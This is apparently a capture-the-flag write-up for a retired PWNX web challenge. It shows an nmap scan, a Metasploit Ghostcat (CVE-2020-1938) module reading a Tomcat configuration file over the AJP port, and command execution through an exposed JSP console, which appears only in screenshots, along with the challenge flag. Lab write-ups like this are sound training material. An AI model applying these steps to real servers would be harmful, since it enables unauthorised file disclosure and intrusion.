---
Category: Web
Difficulty: Easy
Platform: PWNX
Retired: true
Status: 3. Complete
Tags: CVE-2020-1938, Ghostcat, JSP, JSP-console, RCE-JSP, tomcat
---
# Set up

- Start VPN

# Information Gathering

```bash
$ sudo nmap --top-ports 1000 10.10.10.15 -v -oA 1000-top-ports.txt
[sudo] password for maoutis:
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 10:22 CET
Initiating Ping Scan at 10:22
Scanning 10.10.10.15 [4 ports]
Completed Ping Scan at 10:22, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:22
Completed Parallel DNS resolution of 1 host. at 10:22, 0.00s elapsed
Initiating SYN Stealth Scan at 10:22
Scanning 10.10.10.15 [1000 ports]
Discovered open port 8080/tcp on 10.10.10.15
Discovered open port 8009/tcp on 10.10.10.15
Completed SYN Stealth Scan at 10:22, 1.94s elapsed (1000 total ports)
Nmap scan report for 10.10.10.15
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
8009/tcp open  ajp13
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1004 (40.156KB)
```

![Home page](../../zzz_res/attachments/Lechic%2011f587d6d53e4df7a6fb8cb4851ff92c.png)

Home page

## Ghostcat

- Ghostcat (**CVE-2020-1938**)
- [https://blog.qualys.com/product-tech/2020/03/10/detect-apache-tomcat-ajp-file-inclusion-vulnerability-cve-2020-1938-using-qualys-was](https://blog.qualys.com/product-tech/2020/03/10/detect-apache-tomcat-ajp-file-inclusion-vulnerability-cve-2020-1938-using-qualys-was)

```bash
$ msfconsole -q
msf6 > search Ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  No     Ghostcat

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf6 > use 0
msf6 auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL

msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.10.10.15
Status Code: 200
Accept-Ranges: bytes
ETag: W/"6417-1362570432000"
Last-Modified: Wed, 06 Mar 2013 11:47:12 GMT
Content-Type: application/xml
Content-Length: 6417
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_9" version="2.4"
        xmlns="http://java.sun.com/xml/ns/j2ee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">

    <display-name>Struts Showcase Application</display-name>

    <filter>
        <filter-name>struts-prepare</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareFilter</filter-class>
    </filter>

    <filter>
        <filter-name>struts-execute</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsExecuteFilter</filter-class>
    </filter>

   <filter>
       <filter-name>sitemesh</filter-name>
       <filter-class>com.opensymphony.sitemesh.webapp.SiteMeshFilter</filter-class>
   </filter>

    <filter-mapping>
        <filter-name>struts-prepare</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

    <filter-mapping>
        <filter-name>sitemesh</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

    <filter-mapping>
        <filter-name>struts-execute</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>

    <listener>
        <listener-class>
          org.apache.myfaces.webapp.StartupServletContextListener
        </listener-class>
    </listener>

    <listener>
        <listener-class>
            org.apache.struts2.tiles.StrutsTilesListener
        </listener-class>
    </listener>

    <!-- Chat Example in Showcase -->
    <listener>
        <listener-class>
          org.apache.struts2.showcase.chat.ChatSessionListener
        </listener-class>
    </listener>

    <listener>
        <listener-class>org.apache.struts2.dispatcher.ng.listener.StrutsListener</listener-class>
    </listener>

    <!-- SNIPPET START: dwr -->

    <servlet>
        <servlet-name>dwr</servlet-name>
        <servlet-class>uk.ltd.getahead.dwr.DWRServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>true</param-value>
        </init-param>
    </servlet>

        <!-- JavaServer Faces Servlet Configuration, not used directly -->
        <servlet>
        <servlet-name>faces</servlet-name>
            <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
        </servlet>
                <servlet>
        <servlet-name>JspSupportServlet</servlet-name>
        <servlet-class>org.apache.struts2.views.JspSupportServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
        </servlet>

      <!-- Sitemesh Freemarker and Velocity Decorator Servlets. Shares configuration with Struts.-->
    <servlet>
        <servlet-name>sitemesh-freemarker</servlet-name>
        <servlet-class>org.apache.struts2.sitemesh.FreemarkerDecoratorServlet</servlet-class>
        <init-param>
            <param-name>default_encoding</param-name>
            <param-value>UTF-8</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet>
        <servlet-name>sitemesh-velocity</servlet-name>
        <servlet-class>org.apache.struts2.sitemesh.VelocityDecoratorServlet</servlet-class>
        <init-param>
            <param-name>default_encoding</param-name>
            <param-value>UTF-8</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

        <!-- JavaServer Faces Servlet Mapping, not called directly -->
    <servlet-mapping>
        <servlet-name>faces</servlet-name>
        <url-pattern>*.action</url-pattern>
        </servlet-mapping>

    <servlet-mapping>
        <servlet-name>dwr</servlet-name>
        <url-pattern>/dwr/*</url-pattern>
    </servlet-mapping>

    <servlet-mapping>
        <servlet-name>sitemesh-freemarker</servlet-name>
        <url-pattern>*.ftl</url-pattern>
    </servlet-mapping>

    <servlet-mapping>
        <servlet-name>sitemesh-velocity</servlet-name>
        <url-pattern>*.vm</url-pattern>
    </servlet-mapping>

    ...

    <!-- SNIPPET START: example.freemarker.filter.chain
    <filter>
        <filter-name>struts-cleanup</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ActionContextCleanUp</filter-class>
    </filter>
    <filter>
        <filter-name>sitemesh</filter-name>
        <filter-class>org.apache.struts2.sitemesh.FreeMarkerPageFilter</filter-class>
    </filter>
    <filter>
        <filter-name>struts</filter-name>
        <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>struts-cleanup</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>sitemesh</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <filter-mapping>
        <filter-name>struts</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    END SNIPPET: example.freemarker.filter.chain -->

    <welcome-file-list>
        <welcome-file>index.jsp</welcome-file>
        <welcome-file>default.jsp</welcome-file>
        <welcome-file>index.html</welcome-file>
    </welcome-file-list>

</web-app>

[+] 10.10.10.15:8080 - /home/maoutis/.msf4/loot/20220301110825_default_10.10.10.15_WEBINFweb.xml_197617.txt
[*] Auxiliary module execution completed
```

# The Bug

## Exposed JSP Console allows RCE

![Remote Command Execution with tomcat privileges using the JSP console](../../zzz_res/attachments/Lechic%2011f587d6d53e4df7a6fb8cb4851ff92c%201.png)

Remote Command Execution with tomcat privileges using the JSP console

# Exploitation

![List all the files inside the tomatcat directory](../../zzz_res/attachments/Lechic%2011f587d6d53e4df7a6fb8cb4851ff92c%202.png)

List all the files inside the tomatcat directory

![Print the flag](../../zzz_res/attachments/Lechic%2011f587d6d53e4df7a6fb8cb4851ff92c%203.png)

Print the flag

# Flag

>[!success]
>`PWNX{1bb3c7e7b5fc0a4331635e46a420b343}`

![Untitled](../../zzz_res/attachments/Lechic%2011f587d6d53e4df7a6fb8cb4851ff92c%204.png)
